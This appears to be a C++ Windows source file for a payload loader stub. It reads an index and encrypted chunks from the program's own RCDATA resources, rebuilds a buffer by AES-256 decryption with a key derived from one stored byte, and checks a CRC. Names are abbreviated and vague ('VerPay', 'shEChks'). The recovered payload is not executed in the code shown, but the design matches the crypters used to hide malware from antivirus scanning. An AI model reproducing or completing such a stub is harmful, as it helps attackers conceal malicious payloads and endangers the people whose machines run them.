#include <windows.h>
#include <cstdint>
#include <vector>
#include <wincrypt.h>
#include <string>


#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

#define MVAL 0x474E5089

#pragma pack(push, 1)
struct PIndex {
    uint32_t mval = MVAL;
    uint8_t  fkey;
    uint32_t tsize;
    uint16_t ccount;
    uint16_t fchkid;
    uint32_t crc32;
};
#pragma pack(pop)

static const char* resTypeRCDATA = "RCDATA";

unsigned char* LoadResBID(int id, DWORD* size) {    
    HMODULE hMod = GetModuleHandle(NULL);
    if (!hMod) {
        return nullptr;
    }
    
    
 
    HRSRC hRes = FindResourceA(hMod, MAKEINTRESOURCEA(id), resTypeRCDATA);
    if (!hRes) {
        
        hRes = FindResourceW(hMod, MAKEINTRESOURCEW(id), L"RCDATA");
        if (!hRes) {
        } else {
        }
    } else {
    }
    
    if (!hRes) {
        *size = 0;
        return nullptr;
    }
    
   
    *size = SizeofResource(hMod, hRes);
    if (*size == 0) {
        DWORD err = GetLastError();
        return nullptr;
    }
    
    
    HGLOBAL hGlob = LoadResource(hMod, hRes);
    if (!hGlob) {
        DWORD err = GetLastError();
        *size = 0;
        return nullptr;
    }
    
    unsigned char* data = (unsigned char*)LockResource(hGlob);
    if (!data) {
        DWORD err = GetLastError();
        *size = 0;
        return nullptr;
    }
        
    return data;
}

uint32_t CalCR32(const char* data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= (uint32_t)(unsigned char)data[i];
        for (int j = 0; j < 8; j++)
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
    }
    uint32_t result = ~crc;
    return result;
}

bool VerPay(const std::vector<char>& pbuf, uint32_t ecrc, uint32_t esize) {
    
    if (pbuf.size() != esize) {
        return false;
    }
    
    uint32_t actual_crc = CalCR32(pbuf.data(), pbuf.size());
    if (actual_crc != ecrc) {
        return false;
    }
    
    return true;
}



std::pair<PIndex, std::vector<std::vector<BYTE>>> LoadEFR() {
    
    DWORD iSize = 0;
    unsigned char* idata = LoadResBID(999, &iSize);
    
    if (!idata) {
        return {};
    }
    
    
    if (iSize < sizeof(PIndex)) {
        return {};
    }
    
    PIndex* idx = (PIndex*)idata;
    
    if (idx->mval != MVAL) {
        return {};
    }
    
    std::vector<std::vector<BYTE>> shEChks;
    
    for (int respos = 0; respos < idx->ccount; ++respos) {
        int resId = idx->fchkid + respos;
        DWORD chksize = 0;
        
        unsigned char* encbuf = LoadResBID(resId, &chksize);
        
        if (encbuf && chksize > 0) {
            std::vector<BYTE> chunk(encbuf, encbuf + chksize);
            shEChks.push_back(chunk);
        } else {
            return {};
        }
    }
    
    if (shEChks.size() != idx->ccount) {
        return {};
    }
    return {*idx,shEChks};
}



std::vector<char> RecFWRP() {
    
  
    auto [index, enChksLog] = LoadEFR();
    if (enChksLog.empty()) {
        return {};
    }
    
    std::vector<char> pbuf;
    pbuf.reserve(index.tsize + 1024);
    
    HCRYPTPROV hProv = 0;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        DWORD err = GetLastError();
        return {};
    }
    
    BYTE aes_key[32] = {0};
    for (int i = 0; i < 32; i++) aes_key[i] = index.fkey ^ (i * 0x11);
    
    BYTE last_cipher_block[16] = {0};
    
    for (int i = 0; i < index.ccount; ++i) {
        const auto& enc_buf = enChksLog[i];
        DWORD chk_s = (DWORD)enc_buf.size();
        
        BYTE iv[16] = {0};
        if (i > 0) memcpy(iv, last_cipher_block, 16);
        
        struct {
            BLOBHEADER hdr;
            DWORD      dwKeySize;
            BYTE       key[32];
        } keyblob = {0};
        keyblob.hdr.bType = PLAINTEXTKEYBLOB;
        keyblob.hdr.bVersion = CUR_BLOB_VERSION;
        keyblob.hdr.reserved = 0;
        keyblob.hdr.aiKeyAlg = CALG_AES_256;
        keyblob.dwKeySize = 32;
        memcpy(keyblob.key, aes_key, 32);
        
        HCRYPTKEY hKey = 0;
        if (!CryptImportKey(hProv, (BYTE*)&keyblob, sizeof(keyblob), 0, 0, &hKey)) {
            DWORD err = GetLastError();
            CryptReleaseContext(hProv, 0);
            return {};
        }
        
        if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
            DWORD err = GetLastError();
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            return {};
        }
        
        std::vector<BYTE> dec(enc_buf.begin(), enc_buf.end());
        DWORD out_len = chk_s;
        
        if (!CryptDecrypt(hKey, 0, FALSE, 0, dec.data(), &out_len)) {
            DWORD err = GetLastError();
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            return {};
        }
        
        CryptDestroyKey(hKey);
        
        if (chk_s >= 16) memcpy(last_cipher_block, enc_buf.data() + chk_s - 16, 16);
        
        if (out_len > 0) {
            BYTE pad = dec[out_len - 1];
            if (pad >= 1 && pad <= 16) {
                bool valid = true;
                for (int j = 0; j < pad; ++j) {
                    if (dec[out_len - 1 - j] != pad) { valid = false; break; }
                }
                if (valid) {
                    out_len -= pad;
                }
            }
        }
        
        pbuf.insert(pbuf.end(), (char*)dec.data(), (char*)dec.data() + out_len);
    }
    
    CryptReleaseContext(hProv, 0);
    
    if (!VerPay(pbuf, index.crc32, index.tsize)) {
        return {};
    }

    return pbuf;
}


int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    auto pbuf = RecFWRP();
    if (pbuf.empty()) {
        return -1;
    }
    
     
    return 0;
}